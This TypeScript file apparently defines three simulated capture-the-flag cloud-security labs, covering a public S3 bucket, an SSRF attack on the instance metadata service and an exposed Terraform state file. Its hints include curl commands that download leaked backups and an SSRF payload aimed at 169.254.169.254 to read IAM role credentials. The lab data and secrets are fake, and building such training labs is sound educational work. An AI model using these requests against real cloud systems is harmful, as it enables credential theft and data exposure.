import { dir } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker() {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir({}) }) };
}

export const cloudSecurityLabs: LabScenario[] = [
  {
    id: 'cloud-public-s3-bucket',
    title: 'Cloud: Public S3 Bucket Exposure',
    difficulty: 'Easy',
    category: 'Cloud',
    briefing:
      'Meridian Corp hosts static assets on a cloud object storage bucket. Recon revealed the bucket name ' +
      '(meridian-corp-backups) — check whether it was left with public read access, a shockingly common ' +
      'real-world cloud misconfiguration.',
    objectives: [
      'Request the bucket listing endpoint on 10.10.106.1',
      'Confirm public read access is enabled',
      'Retrieve the leaked backup file and capture the flag',
    ],
    hints: [
      'curl "http://10.10.106.1/meridian-corp-backups/"  to list bucket contents.',
      'curl "http://10.10.106.1/meridian-corp-backups/db-backup-2026-07.sql" to download a listed file directly.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 's3-emulator', ip: '10.10.106.1', os: 'Cloud object storage (S3-compatible)',
        services: [{
          port: 80, name: 'http', version: 'S3-compatible object storage',
          http: {
            '/meridian-corp-backups/': '<ListBucketResult><Contents><Key>db-backup-2026-07.sql</Key></Contents><Contents><Key>employee-export.csv</Key></Contents></ListBucketResult>\n<!-- ACL: public-read (misconfigured) -->',
            '/meridian-corp-backups/db-backup-2026-07.sql': '-- Meridian Corp database backup\n-- WARNING: this bucket should never have been public\nINSERT INTO admin_users VALUES (1, \'admin\', \'hash...\');\n-- flag{public_s3_bucket_leaks_database_backup}',
            '/meridian-corp-backups/employee-export.csv': 'name,email,ssn\nJohn Doe,john@meridiancorp.example,REDACTED\n',
          },
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'cloud-metadata-ssrf',
    title: 'Cloud: IAM Credential Leak via SSRF',
    difficulty: 'Hard',
    category: 'Cloud',
    briefing:
      'An internal reporting dashboard hosted on cloud infrastructure fetches a "data source" URL you control. ' +
      'This is the exact SSRF pattern from the Web Application Hacking module — now applied against the ' +
      'cloud instance metadata service to steal the instance\'s IAM role credentials.',
    objectives: [
      'Confirm the dashboard\'s data-source fetch feature works with a normal URL',
      'Redirect it to the cloud instance metadata endpoint',
      'Capture the leaked IAM credentials in the flag',
    ],
    hints: [
      'curl "http://10.10.106.2/dashboard/datasource?url=https://example.com/data.json"',
      'curl "http://10.10.106.2/dashboard/datasource?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/reporting-role"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'reporting-dashboard', ip: '10.10.106.2', os: 'Cloud VM (IAM instance role attached)',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0',
          http: {},
          vulnRoutes: [{
            kind: 'ssrf', path: '/dashboard/datasource', param: 'url',
            triggerSubstrings: ['169.254.169.254', 'metadata', 'localhost', '127.0.0.1'],
            vulnerableResponse: '{"AccessKeyId":"AKIA-SIMULATED","SecretAccessKey":"REDACTED-VIA-SSRF","Role":"reporting-role","flag":"flag{cloud_metadata_ssrf_leaks_iam_role_credentials}"}',
            normalResponse: '{"status":"ok","rows":12}',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'cloud-exposed-terraform-state',
    title: 'Cloud: Exposed Infrastructure-as-Code State File',
    difficulty: 'Medium',
    category: 'Cloud',
    briefing:
      'A DevOps team accidentally left their Terraform state file readable on a public web endpoint. State ' +
      'files routinely contain plaintext secrets (database passwords, API keys) for every resource they ' +
      'manage — this is a very real, very common cloud misconfiguration.',
    objectives: [
      'Scan 10.10.106.3 and enumerate the web server',
      'Locate the exposed terraform.tfstate file',
      'Extract the leaked secret and capture the flag',
    ],
    hints: [
      'nmap -sV 10.10.106.3',
      'curl 10.10.106.3/robots.txt might hint at the path, or just try: curl 10.10.106.3/terraform.tfstate',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'infra-host', ip: '10.10.106.3', os: 'Ubuntu 22.04',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0',
          http: {
            '/': '<html><body><h1>Infra status page</h1></body></html>',
            '/robots.txt': 'User-agent: *\nDisallow: /terraform.tfstate\n',
            '/terraform.tfstate': JSON.stringify(
              {
                resources: [
                  {
                    type: 'aws_db_instance',
                    name: 'primary',
                    instances: [{ attributes: { username: 'dbadmin', password: 'Terraf0rm_Leak_2026!', note: 'flag{terraform_state_file_leaks_db_password}' } }],
                  },
                ],
              },
              null,
              2,
            ),
          },
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
];
